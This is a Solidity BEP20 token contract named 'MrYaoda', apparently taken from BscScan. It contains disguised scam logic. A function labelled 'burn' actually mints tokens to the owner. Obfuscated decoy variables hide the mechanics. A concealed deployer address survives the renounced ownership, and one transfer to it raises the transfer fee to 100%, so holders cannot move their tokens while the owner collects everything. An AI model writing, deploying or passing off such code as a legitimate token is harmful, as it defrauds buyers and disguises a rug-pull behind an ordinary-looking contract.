/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;
contract MrYaoda {
address public owner;
uint256 public  UGrmrf = 100000000000000000;
address public  DfKIRP = address(0);
uint256 public constant xMYOUz = 9+1;
uint256 public  qszkdQ = 100000000000000000000000;
uint256 private  fbZpnq = 10000000000000;
address public  yNrAnJ = address(0);
mapping (address => uint256) public balanceOf;
string public  name = "MrYaoda";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  cfIPkY = 100000000000000000000000;
address private  xVvviQ = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  uhLVIM = 1000000000000000000;
address public  pCddzb = address(0);
uint256 public  swNwrH = 10000000000000000;
address public  hVPpLW = address(0);
address public  jNUgcP = address(0);
uint256 public  aVPJCi = 100000000000000000000;
string public  symbol = "MrYaoda";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  HBGWFE = 10000000000000000000;
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  hNcnyx = address(0);
uint256 public  FVsced = 10000000000000000000000000000;
constructor () {
xVvviQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "SlCsMM");
require(to != address(0), "SlCsMM");
require(amount <= balanceOf[from], "SlCsMM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* xMYOUz/fbZpnq ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==xVvviQ){
fbZpnq = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}